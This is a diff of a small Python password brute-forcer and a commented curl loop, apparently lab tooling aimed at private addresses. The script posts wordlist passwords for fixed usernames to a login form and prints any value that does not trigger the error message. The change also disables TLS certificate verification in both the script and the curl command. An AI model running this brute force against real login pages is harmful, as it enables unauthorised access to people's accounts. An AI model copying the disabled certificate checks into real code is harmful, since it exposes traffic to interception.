@@ -2,9 +2,9 @@
 # can be used for password brute force or to predict other token
 import requests
 
-def get_response_code(datafield=[], urI="http://10.10.10.10/index.php", theErrorIs="Invalid", key="password"):
+def get_response_code(datafield=[], urI="https://10.10.10.10/index.php", theErrorIs="Invalid", key="password"):
     for value in datafield:
-        response = requests.post(urI, data={"username": "bob", key: value})
+        response = requests.post(urI, data={"username": "bob", key: value}, verify=False)
         if theErrorIs not in response.text:
              print(f"[+] post data: {key}={value}")
 
@@ -19,5 +19,5 @@ if __name__ == "__main__":
     get_response_code(generate_input_data())
 
 # simple redirect check using a list of parameters
-# for key in $(cat list); do printf "\n[i] param: "$key"\n" >&2; curl -v http://10.112.167.162/labs/lab1/index.php -H "Content-Type: application/x-www-form-urlencoded" -d "username=Mark&password="$key; done 2>> "post_delay_$(date +%Y%m%dT%H%M%SZ).log"
+# for key in $(cat list); do printf "\n[i] param: "$key"\n" >&2; curl -v -k https://10.10.10.10/index.php -H "Content-Type: application/x-www-form-urlencoded" -d "username=Mark&password="$key; done 2>> "post_delay_$(date +%Y%m%dT%H%M%SZ).log"
 #
